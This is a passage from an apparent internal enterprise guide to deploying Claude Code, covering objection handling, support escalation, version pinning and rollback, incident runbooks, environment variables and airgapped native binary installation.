Response: We've deployed on AWS Bedrock / GCP Vertex AI, which means your code never leaves your cloud environment. The model runs inside your AWS/GCP account boundary. Additionally, Claude Code doesn't send full codebases — it reads files locally and only sends relevant context per query. Our OTEL audit trail shows exactly what was sent each session.

**"The cost is too high / uncontrolled"**

Response: We've implemented per-developer daily budget caps enforced at the managed settings level — developers cannot exceed their allocation. Our FinOps dashboard shows cost per developer, per team, and per project in real time. We've also configured prompt caching and model tier policies that put Haiku on routine tasks (80% cheaper than Sonnet), reserving Sonnet/Opus for complex work.

**"We'll become dependent on it and not learn"**

Response: Claude Code has a `plan` mode that only explains what it would do without executing. Junior developers can use this to build understanding. Our model tier policy assigns lower-capability models to junior engineers by default, encouraging active engagement rather than passive acceptance. The `/advisor` command provides architecture guidance without writing code.

**"What if the API goes down?"**

Response: Claude Code works offline for local analysis. For API-dependent tasks, we have failover routing between Bedrock and Vertex AI, with automated health checks. Our CI/CD pipelines have fallback steps for when Claude Code is unavailable. We treat it as an enhancement to developer velocity, not a critical dependency in the build pipeline.

---

## 13. Enterprise Support & Escalation

### Support Channels

| Issue Type | Primary Channel | Escalation | SLA |
|-----------|----------------|-----------|-----|
| Individual developer issue | Internal Slack `#claude-code-help` | Platform team DM | Best effort |
| Configuration/policy question | Platform team Confluence wiki | Platform team | 1 business day |
| Compliance hook failure | JIRA ticket → Security team | CISO | 4 hours |
| Cost anomaly (>2× expected) | FinOps Slack alert | AI Ops lead | 2 hours |
| API outage / availability | Status page: status.anthropic.com | Anthropic Enterprise Support | Per SLA |
| Data handling / privacy concern | Legal & Compliance | CISO + Legal | 1 business day |

**Anthropic Enterprise Support:**

Enterprise customers have access to Anthropic Enterprise Support with defined SLAs. Contact information and escalation paths are provided in your enterprise agreement. For P0/P1 incidents:

1. File a ticket via the Anthropic enterprise portal
2. Escalate in your Anthropic Slack Connect channel (if provisioned)
3. Call the enterprise support line for critical production incidents

### Version Pinning Strategies

**For developer workstations:**

```json
// managed-settings.json
{
  "disableAutoUpdate": true,
  "pinnedVersion": "2.1.126"
}
```

**For Docker/CI images:**

```dockerfile
FROM node:20-slim AS base
# Pin exact Claude Code version — never use 'latest' in production CI
RUN npm install -g @anthropic-ai/claude-code@2.1.126

# Verify the installed version
RUN claude --version | grep -q "2.1.126" || (echo "Version mismatch" && exit 1)
```

**Managed rollout for version upgrades:**

When upgrading from `2.1.126` to a future version:

```
1. Platform team tests new version on pilot machines (1 week)
2. Run regression tests: test-policy.sh, compliance hook validation
3. Update Claude-Training content for any breaking changes
4. Stage rollout: pilot → early adopters → broad rollout (same wave structure)
5. Keep previous version available for 2 weeks as rollback target
6. Update CLAUDE_CODE_VERSION pin in all CI/CD configs
```

**Rollback procedure:**

```bash
# Emergency rollback to previous version
npm install -g @anthropic-ai/claude-code@2.1.100  # previous stable

# Update managed settings to pin old version
sed -i 's/"pinnedVersion": "2.1.126"/"pinnedVersion": "2.1.100"/' \
  /etc/claude-code/managed-settings.json

# Notify team via incident channel
curl -s -X POST "$SLACK_WEBHOOK" \
  -H "Content-Type: application/json" \
  -d '{"text": "Claude Code rolled back to v2.1.100 — investigation in progress"}'
```

### Incident Response for AI-Related Outages

**Severity definitions:**

| Severity | Definition | Example |
|----------|-----------|---------|
| P0 | All developers blocked, CI/CD failing | API key revoked, Bedrock auth failure |
| P1 | > 50 developers affected or compliance breach | Hook false positive blocks all writes |
| P2 | > 10 developers affected | MCP server down, OTEL not collecting |
| P3 | Individual developer issue | Plugin not loading, settings misconfigured |

**P0/P1 runbook:**

```
1. IMMEDIATE (0–15 min)
   - Identify blast radius: how many developers affected?
   - Check Anthropic status page: status.anthropic.com
   - Check cloud provider status (AWS/GCP if using Bedrock/Vertex)
   - Disable blocking hooks if they're causing the P0

2. INVESTIGATION (15–60 min)
   - Review OTEL traces for error patterns
   - Check managed-settings.json was not accidentally modified
   - Review recent plugin version changes
   - Examine system logs: /var/log/claude-code/

3. MITIGATION (varies)
   - Roll back if recent version change caused the issue
   - Switch cloud provider if API outage (Bedrock ↔ Vertex ↔ Direct API)
   - Disable non-essential hooks to unblock developers
   - Issue workaround instructions to #claude-code-help

4. RESOLUTION & POSTMORTEM
   - Root cause analysis in JIRA
   - Update runbooks with new failure mode
   - Review whether policy or monitoring could have caught it sooner
```

---

## Appendix: Environment Variable Quick Reference

| Variable | Purpose | Example |
|----------|---------|---------|
| `ANTHROPIC_API_KEY` | Direct API authentication | `sk-ant-...` |
| `ANTHROPIC_MODEL` | Default model | `claude-sonnet-4-6` |
| `ANTHROPIC_BUDGET_TOKEN_CAP` | Hard token limit per session | `500000` |
| `ANTHROPIC_BUDGET_USD_CAP` | Hard dollar limit per session | `5.00` |
| `CLAUDE_CODE_USE_BEDROCK` | Enable Bedrock routing | `1` |
| `CLAUDE_CODE_USE_VERTEX` | Enable Vertex AI routing | `1` |
| `CLOUD_ML_REGION` | Vertex AI region | `us-east5` |
| `ANTHROPIC_VERTEX_PROJECT_ID` | GCP project for Vertex | `acme-ai-prod` |
| `AWS_REGION` | AWS region for Bedrock | `us-east-1` |
| `CLAUDE_CODE_MANAGED_SETTINGS_PATH` | Override managed settings path | `/etc/claude-code/managed-settings.json` |
| `CLAUDE_CODE_PERMISSION_MODE` | Session permission mode | `acceptEdits` |
| `DISABLE_TELEMETRY` | Disable all telemetry | `1` |
| `DISABLE_UPDATES` | Disable auto-updates | `1` |
| `OTEL_EXPORTER_OTLP_ENDPOINT` | OTEL collector endpoint | `https://otel.corp.com:4318` |
| `OTEL_EXPORTER_OTLP_PROTOCOL` | OTEL transport protocol | `http/protobuf` |
| `OTEL_EXPORTER_OTLP_HEADERS` | OTEL auth headers | `x-api-key=...` |
| `OTEL_SERVICE_NAME` | OTEL service identifier | `claude-code` |
| `OTEL_RESOURCE_ATTRIBUTES` | OTEL static attributes | `env=prod,team=payments` |
| `CLAUDE_CODE_MCP_CLIENT_ID` | OAuth client ID for MCP | `claude-code-prod` |
| `CLAUDE_CODE_MCP_CLIENT_SECRET` | OAuth client secret for MCP | (from vault) |
| `SIEM_ENDPOINT` | SIEM forwarding URL (hooks) | `https://siem.corp.com` |
| `SIEM_TOKEN` | SIEM auth token (hooks) | (from vault) |
| `JIRA_TOKEN` | Jira API token (stop hooks) | (from vault) |

---

---

## Related Visual Guides

- [Enterprise Deployment — Diagram](./enterprise-diagram) — Interactive managed settings hierarchy, auth provider comparison, audit logging destinations, cost governance dashboard, and rollout playbook
- [Permissions & Security — Diagram](./permissions-diagram) — Visual permission layer pyramid, sandbox architecture, and audit log format
- [CI/CD Pipeline — Diagram](./cicd-diagram) — Full pipeline flow with Bedrock/Vertex auth patterns

---

*Document version: v2.1.126 · Last updated: 2026-06-02 · Maintained by Platform Team*
*Feedback: `#claude-code-help` on Slack or open a ticket in JIRA → PLATFORM project*

---

## Native Binary Deployment for Enterprise

As of v2.1.113, Claude Code ships as a platform-native binary (not a Node.js application). This changes the enterprise deployment model:

### What Changed

| Aspect | Before v2.1.113 (Node.js) | v2.1.113+ (Native Binary) |
|--------|--------------------------|--------------------------|
| Runtime required | Node.js 18+ must be installed | **No runtime required** after install |
| Install via npm | `npm install -g @anthropic-ai/claude-code` | Same command, but downloads native binary |
| Binary location after install | Node.js-managed path | Platform PATH (e.g., `/usr/local/bin/claude`) |
| Cold start time | 2-3 seconds (Node.js JIT) | 1-2 seconds (~40% faster) |
| Memory at startup | ~180MB (Node.js + app) | ~85MB (native binary only) |
| Airgap deployment | Needed Node.js + npm package | **Binary only, no Node.js needed** |

### Airgap Deployment Steps

For organizations with no internet access on developer machines:

```bash
# Step 1: Download the native binary on an internet-connected machine
# Platform-specific download:
curl -fsSL https://claude.ai/download/linux-x64 -o claude-linux-x64
curl -fsSL https://claude.ai/download/darwin-arm64 -o claude-darwin-arm64
curl -fsSL https://claude.ai/download/win-x64.exe -o claude-win-x64.exe

# Step 2: Verify the binary checksum (checksums published at claude.ai/checksums)
sha256sum claude-linux-x64 | grep <expected-checksum>

# Step 3: Distribute via MDM, Ansible, or internal package repository
# macOS via JAMF:
jamf_pkg_build --binary=claude-darwin-arm64 --install-path=/usr/local/bin/claude

# Linux via Ansible:
- name: Deploy Claude Code binary
  copy:
    src: claude-linux-x64
    dest: /usr/local/bin/claude
    mode: '0755'

# Step 4: Configure DISABLE_UPDATES to prevent update checks
# In managed-settings.json:
{
  "env": {
    "DISABLE_UPDATES": "1"
  }
}
```

### DISABLE_UPDATES for Enterprise Fleets

`DISABLE_UPDATES=1` prevents Claude Code from checking for updates, prompting users to upgrade, or auto-installing new versions. This is critical for:
- **Regression prevention**: Pin a tested version across the fleet
- **Airgap compliance**: No outbound version-check requests
- **Reproducible builds**: CI/CD always uses the same Claude Code version

Set it in enterprise managed settings to enforce it org-wide:

```json
// ~/.claude/managed-settings.json (deployed by MDM)
{
  "env": {
    "DISABLE_UPDATES": "1",
    "DISABLE_TELEMETRY": "1"    // Optional: disable telemetry in enterprise
  }
}
```

Note: `DISABLE_UPDATES` prevents auto-updates but does NOT prevent manual updates via `claude update` (if the user has internet access). To prevent manual updates in airgap environments, use file system permissions to make the binary read-only after deployment.
